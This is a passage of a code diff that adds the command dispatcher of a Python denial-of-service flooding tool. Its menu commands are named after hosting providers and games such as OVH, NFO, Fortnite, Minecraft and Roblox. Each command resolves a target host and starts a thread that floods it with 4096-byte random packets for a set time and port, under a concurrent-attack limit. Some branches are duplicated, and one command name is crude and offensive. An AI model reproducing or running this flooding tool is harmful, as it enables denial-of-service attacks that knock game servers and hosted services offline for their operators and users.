+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-null":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-slam":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-clap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-slam":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-clap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-slump":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-drop":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-rape":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-slav":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-kill":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-null":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-slam":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-clap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "nfo-slump":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "game-all":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "r6-drop":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "cod-drop":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "fortnite-drop":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "minecraft":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "amongus":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "roblox":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "pixelgunslam":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "stop":
+			attack = False
+			while not attack:
+				if aid == 0:
+					attack = True
+
+		else:
+			main()
+
+
+try:
+	clear = "cls"
+	os.system(clear)
+	print(banner)
+	main()
+except KeyboardInterrupt:
+	exit()
+
